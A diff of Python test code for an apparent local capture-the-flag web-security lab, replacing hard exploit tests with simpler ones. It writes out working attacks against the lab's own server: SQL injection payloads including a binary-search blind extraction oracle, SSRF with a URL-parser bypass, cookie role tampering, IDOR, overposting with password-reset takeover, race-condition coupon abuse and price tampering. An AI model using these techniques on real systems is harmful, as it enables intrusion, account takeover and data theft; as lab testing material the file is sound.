@@ -4,7 +4,6 @@ import json
 import secrets
 import socket
 import unittest
-from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlencode
 
 from server import SITES, Suite
@@ -85,6 +84,11 @@ class LabTests(unittest.TestCase):
         self.assertEqual(status, 200)
         self.assertEqual(len(targets['targets']), 10)
         self.assertEqual(sum(t['difficulty'] == 'easy' for t in targets['targets']), 5)
+        self.assertEqual(sum(t['difficulty'] == 'bronze' for t in targets['targets']), 5)
+        portal = self.client(0).request()[1]
+        for target in targets['targets']:
+            self.assertIn(target['url'], portal)
+        self.assertNotIn('Diamond Target', portal)
 
     def test_easy_01_sql_injection_with_admin_impact(self):
         client = self.client(1)
@@ -139,125 +143,92 @@ class LabTests(unittest.TestCase):
         self.assertEqual(status, 200)
         self.assertEqual(result['flag'], self.suite.labs[4].flag)
 
-    def test_hard_01_second_order_blind_oracle_extracts_flag(self):
+    def test_bronze_01_search_sql_injection(self):
         client = self.client(6)
-        client.login()
+        status, result, _ = client.request('/search?' + urlencode({'q': 'Notebook'}))
+        self.assertEqual(status, 200)
+        self.assertEqual(result['products'], [{'id': 1, 'title': 'Notebook'}])
+        public = client.request('/search?' + urlencode({'q': ''}))[1]['products']
+        self.assertEqual(len(public), 3)
+        self.assertNotIn(self.suite.labs[5].flag, str(public))
+        self.assertEqual(client.request('/search?' + urlencode({'q': "'"}))[0], 400)
+        false_result = client.request('/search?' + urlencode({'q': "missing%' OR 1=2 -- "}))[1]
+        self.assertEqual(false_result['products'], [])
+        status, result, _ = client.request('/search?' + urlencode({'q': "missing%' OR 1=1 -- "}))
+        self.assertEqual(status, 200)
+        self.assertIn({'id': 4, 'title': self.suite.labs[5].flag}, result['products'])
 
-        def oracle(condition):
-            payload = "missing%' OR (" + condition + ') -- '
-            status, saved, _ = client.request('/api/searches', 'POST', {'filter': {'title': payload}})
-            self.assertEqual(status, 201)
-            status, result, _ = client.request(saved['run'], 'POST', {})
-            self.assertEqual(status, 200)
-            self.assertEqual(set(result), {'available', 'source'})
-            return result['available']
-
-        normal = client.request('/api/searches', 'POST', {'filter': {'title': 'Notebook'}})[1]
-        missing = client.request('/api/searches', 'POST', {'filter': {'title': 'nonexistent'}})[1]
-        self.assertTrue(client.request(normal['run'], 'POST', {})[1]['available'])
-        self.assertFalse(client.request(missing['run'], 'POST', {})[1]['available'])
-        self.assertTrue(oracle('1=1'))
-        self.assertFalse(oracle('1=2'))
-        # Infer length and every character through the saved-filter worker.
-        length = 0
-        while oracle(f'(SELECT length(value) FROM secrets)>{length}'):
-            length += 1
-            self.assertLess(length, 100)
-        recovered = ''
-        for index in range(1, length + 1):
-            low, high = 32, 126
-            while low < high:
-                mid = (low + high) // 2
-                if oracle(f'(SELECT unicode(substr(value,{index},1)) FROM secrets)>{mid}'):
-                    low = mid + 1
-                else:
-                    high = mid
-            recovered += chr(low)
-        self.assertEqual(recovered, self.suite.labs[5].flag)
-
-    def test_hard_02_identity_overposting_reset_chain(self):
+    def test_bronze_02_cookie_role_tampering(self):
         client = self.client(7)
-        self.assertEqual(client.request('/api/profile')[0], 401)
-        client.login()
-        self.assertEqual(client.request('/api/admin/report')[0], 403)
-        self.assertEqual(client.request('/api/profile', 'PATCH', {'display_name': 'Test'})[1]['role'], 'member')
-        self.assertEqual(client.request('/api/admin/report')[0], 403)
-        # Direct role overposting is ineffective; the internal user id is writable.
-        self.assertEqual(client.request('/api/profile', 'PATCH', {'role': 'admin'})[1]['role'], 'member')
-        self.assertEqual(client.request('/api/profile', 'PATCH', {'id': 2})[1]['id'], 2)
-        client.request('/api/password-reset', 'POST', {'username': 'admin'})
-        token = client.request('/api/notifications')[1]['items'][-1]['token']
-        new_password = 'reset-lab-2026!'
-        self.assertEqual(client.request('/api/password-reset/confirm', 'POST',
-                                        {'token': token, 'new_password': new_password})[0], 200)
-        self.assertEqual(client.request('/api/login', 'POST', {'username': 'admin', 'password': new_password})[0], 200)
-        self.assertEqual(client.request('/api/admin/report')[1]['flag'], self.suite.labs[6].flag)
+        self.assertEqual(client.request('/admin')[0], 403)
+        _, _, headers = client.request()
+        self.assertIn('lab_role_hard-02=member', headers['Set-Cookie'])
+        self.assertEqual(client.request('/admin')[0], 403)
+        client.cookie = 'lab_role_hard-02=admin'
+        # A second home visit must preserve the edited role cookie.
+        self.assertNotIn('Set-Cookie', client.request()[2])
+        status, result, _ = client.request('/admin')
+        self.assertEqual(status, 200)
+        self.assertEqual(result['flag'], self.suite.labs[6].flag)
+        client.cookie = 'lab_role_hard-02=owner'
+        self.assertEqual(client.request('/admin')[0], 403)
 
-    def test_hard_03_cross_tenant_export_bypass(self):
+    def test_bronze_03_direct_organization_idor(self):
         client = self.client(8)
+        self.assertEqual(client.request('/api/organizations/northstar/summary')[0], 401)
         client.login()
-        self.assertEqual(client.request('/api/organizations/northstar/summary')[0], 403)
-        self.assertEqual(client.request('/api/organizations/acme/summary')[0], 200)
-        self.assertEqual(client.request('/api/organizations/northstar/exports', 'POST', {'format': 'json'})[0], 403)
-        operations = [{'action': 'export', 'organization': 'acme'},
-                      {'action': 'export', 'organization': 'northstar'}]
-        status, batch, _ = client.request('/api/batch', 'POST', {'operations': operations})
+        self.assertEqual(client.request('/api/me')[1]['organization'], 'acme')
+        directory = client.request('/api/organizations')[1]['organizations']
+        self.assertIn('northstar', [item['id'] for item in directory])
+        status, own, _ = client.request('/api/organizations/acme/summary')
         self.assertEqual(status, 200)
-        self.assertEqual([item['status'] for item in batch['results']], [201, 201])
-        export = batch['results'][1]
-        other = self.client(8)
-        self.assertEqual(other.request(export['download'])[0], 401)
-        status, result, _ = client.request(export['download'])
+        self.assertNotIn('private_note', own)
+        status, other, _ = client.request('/api/organizations/northstar/summary')
         self.assertEqual(status, 200)
-        self.assertEqual(result['records'][0]['memo'], self.suite.labs[7].flag)
+        self.assertEqual(other['private_note'], self.suite.labs[7].flag)
+        self.assertEqual(client.request('/api/organizations/unknown/summary')[0], 404)
 
-    def test_hard_04_ssrf_service_token_chain(self):
+    def test_bronze_04_direct_internal_url_ssrf(self):
         client = self.client(9)
-        self.assertEqual(client.request('/api/admin/export')[0], 403)
-        self.assertEqual(Client(self.base + 99).request('/internal/config')[0], 403)
-        public = client.request('/api/preview', 'POST', {'url': 'http://preview.internal/public/help'})[1]
-        asset = json.loads(public['content'])['assets'][0]
-        script = client.request('/api/preview', 'POST', {'url': 'http://preview.internal' + asset})[1]['content']
-        self.assertIn('/internal/config', script)
-        bypass = f'http://preview.internal@127.0.0.1:{self.base + 99}/internal/config'
-        status, response, _ = client.request('/api/preview', 'POST', {'url': bypass})
+        self.assertEqual(Client(self.base + 99).request('/internal/flag')[0], 403)
+        status, response, _ = client.request('/api/preview', 'POST', {'url': 'http://preview.internal/public/help'})
         self.assertEqual(status, 200)
-        token = json.loads(response['content'])['service_token']
-        status, result, _ = client.request('/api/admin/export', headers={'Authorization': 'Bearer ' + token})
+        public = json.loads(response['content'])
+        self.assertNotIn(self.suite.labs[8].flag, response['content'])
+        self.assertEqual(public['internal_url'], f'http://127.0.0.1:{self.base + 99}/internal/flag')
+        status, response, _ = client.request('/api/preview', 'POST', {'url': public['internal_url']})
         self.assertEqual(status, 200)
-        self.assertEqual(result['flag'], self.suite.labs[8].flag)
+        self.assertEqual(json.loads(response['content'])['flag'], self.suite.labs[8].flag)
 
-    def test_hard_05_coupon_redemption_race(self):
+    def test_bronze_05_client_price_tampering(self):
         client = self.client(10)
+        payload = {'product': 'premium-report', 'price': 100}
+        self.assertEqual(client.request('/api/purchase', 'POST', payload)[0], 401)
         client.login()
+        self.assertEqual(client.request('/api/wallet')[1], {'credits': 30, 'premium_price': 100})
+        self.assertEqual(client.request('/api/purchase', 'POST', payload)[0], 402)
+        for price in (None, 0, -1, True, '1', 1.5):
+            with self.subTest(price=price):
+                self.assertEqual(client.request('/api/purchase', 'POST', {'product': 'premium-report', 'price': price})[0], 400)
         self.assertEqual(client.request('/api/wallet')[1]['credits'], 30)
-        self.assertEqual(client.request('/api/purchase', 'POST', {'product': 'premium-report'})[0], 402)
-        order = client.request('/api/orders', 'POST', {'product': 'notebook'})[1]['order_id']
-        payload = {'code': 'WELCOME20', 'order_id': order}
-        racers = [self.client(10) for _ in range(8)]
-        for racer in racers:
-            racer.cookie = client.cookie
-        with ThreadPoolExecutor(max_workers=8) as pool:
-            statuses = list(pool.map(lambda racer: racer.request('/api/coupons/redeem', 'POST', payload)[0], racers))
-        self.assertGreaterEqual(statuses.count(200), 4)
-        self.assertEqual(client.request('/api/coupons/redeem', 'POST', payload)[0], 409)
-        self.assertGreaterEqual(client.request('/api/wallet')[1]['credits'], 110)
-        status, result, _ = client.request('/api/purchase', 'POST', {'product': 'premium-report'})
+        self.assertEqual(client.request('/api/purchase', 'POST', {'product': 'unknown', 'price': 1})[0], 400)
+        status, result, _ = client.request('/api/purchase', 'POST', {'product': 'premium-report', 'price': 1})
         self.assertEqual(status, 200)
         self.assertEqual(result['flag'], self.suite.labs[9].flag)
+        self.assertEqual(result['credits'], 29)
 
     def test_sessions_and_wallets_are_isolated(self):
-        client = self.client(7)
+        client = self.client(8)
         client.login()
-        client.request('/api/profile', 'PATCH', {'id': 2})
-        other_site = self.client(8)
+        other_site = self.client(10)
         other_site.cookie = client.cookie
-        self.assertEqual(other_site.request('/api/me')[0], 401)
+        self.assertEqual(other_site.request('/api/wallet')[0], 401)
         one, two = self.client(10), self.client(10)
         one.login()
         two.login()
-        order = one.request('/api/orders', 'POST', {'product': 'notebook'})[1]['order_id']
-        self.assertEqual(two.request('/api/coupons/redeem', 'POST', {'code': 'WELCOME20', 'order_id': order})[0], 400)
+        one.request('/api/purchase', 'POST', {'product': 'premium-report', 'price': 1})
+        self.assertEqual(one.request('/api/wallet')[1]['credits'], 29)
+        self.assertEqual(two.request('/api/wallet')[1]['credits'], 30)
 
     def test_non_sql_labs_have_parameterized_login(self):
         for number in range(2, 11):
